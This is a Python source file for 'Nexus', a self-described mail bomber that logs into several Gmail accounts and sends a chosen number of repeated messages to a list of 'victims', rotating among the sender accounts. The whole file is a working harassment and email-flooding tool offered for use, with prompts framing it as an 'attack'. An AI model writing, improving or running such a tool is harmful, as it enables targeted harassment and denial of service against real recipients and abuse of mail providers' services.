import os, smtplib, sys
from random import choice
from termcolor import colored as cl
from pyfiglet import figlet_format as ff

os.system('clear')

def get_email_for_spam(eaccs):
    email_address = choice(eaccs)
    return email_address

def send_mail(sacc, vacc, sacc_pass, qty, msgs):
    cnt = 0
    for i in vacc:
        to_addr = i
        if cnt == 0:
            print(cl(f'Sending mail(s) to {to_addr}', 'green'))
            cnt += 1
        from_addr = get_email_for_spam(sacc)
        from_addr_pass = sacc_pass[sacc.index(from_addr)]
        if 'gmail' in from_addr:
            try:
                obj = smtplib.SMTP('smtp.gmail.com', 587)
            except:
                obj = smtplib.SMTP('smtp.gmail.com', 465)
            try:
                obj.ehlo()
            except:
                print(cl('Connection could not be established.', 'red'))
                break
            try:
                obj.starttls()
            except:
                print(cl('TLS could not be established.', 'red'))
                break
            try:
                obj.login(from_addr, from_addr_pass)
            except:
                print(cl('Could not login', 'red'))
                break
            for i in range(qty):
                try:
                    obj.sendmail(from_addr, to_addr, msgs[sacc.index(from_addr)])
                    print(cl('Mail sent successfully.', 'green'))
                except:
                    print(cl('Mail could not be sent.', 'red'))
        else:
            print(cl('Service yet to be supported, sorry for the incovenience.', 'red'))

print(cl('='*30, 'red'))
print(cl(ff('Nexus')+'\n\t-A mail bomber program.\n\t-An AYLIT Production.\n\t-v1.1', 'red'))
print(cl('='*30, 'red'))
print('\n')

try:
	mails_to_be_sent = int(input(cl('No of mails to be sent:', 'yellow')).strip())
	print('='*20)
except:
	print(cl('The input must be an integer', 'red'))
	sys.exit()

mail_accounts_for_attack, account_passwords, victims, messages = [], [], [], []

for i in range(int(input(cl('No. of mail accounts to be use for the attack:', 'yellow')).strip())):
    mail_accounts_for_attack.append(input(cl(f'Enter the mail ID {str(i+1)} for attack:', 'yellow')).strip())
    account_passwords.append(input(cl(f'Enter the password for {mail_accounts_for_attack[-1]}:', 'yellow')))
    messages.append(input(cl(f'Enter the message to be sent from {mail_accounts_for_attack[-1]}:', 'yellow')).strip())
    print(cl('-'*10, 'white'))

print(cl('='*20, 'white'))

for j in range(int(input(cl('No. of victims:', 'yellow')).strip())):
    victims.append(input(cl(f'Enter the ID of the victim {str(j+1)}:', 'yellow')).strip())
    print(cl('-'*10, 'white'))

send_mail(mail_accounts_for_attack, victims, account_passwords, mails_to_be_sent, messages)
os.system('clear')

while True:
	print(cl('='*30, 'red'))
	print(cl(ff('Nexus')+'\n\t-An AYLIT Production\n\t-v1.0', 'red'))
	print(cl('='*30, 'red'))
	print('\n')
	if input(cl('Quit(y/n)? ', 'red')).lower().strip() == 'n':
		try:
			mails_to_be_sent = int(input(cl('No of mails to be sent:', 'yellow')).strip())
		except:
			print(cl('The input be an integer', 'red'))
			sys.exit()
        
		mail_accounts_for_attack, account_passwords, victims, messages = [], [], [], []
		for i in range(int(input(cl('No. of mail accounts to be used for the attack:', 'yellow')).strip())):
			mail_accounts_for_attack.append(input(cl(f'Enter the mail ID {str(i+1)} for attack:', 'yellow')).strip())
			account_passwords.append(input(cl(f'Enter the password to be sent for {mail_accounts_for_attack[-1]}:', 'yellow')))
			messages.append(input(cl(f'Enter the message to be sent from {mail_accounts_for_attack[-1]}:', 'yellow')).strip())
			print(cl('-'*10, 'white'))
		print(cl('='*20, 'white'))
		for j in range(int(input(cl('No. of victims:', 'yellow')).strip())):
			victims.append(input(cl(f'Enter the ID of the victim {str(j+1)}:', 'yellow')).strip())
		send_mail(mail_accounts_for_attack, victims, account_passwords, mails_to_be_sent, messages)
		os.system('cls')
	else:
		sys.exit()
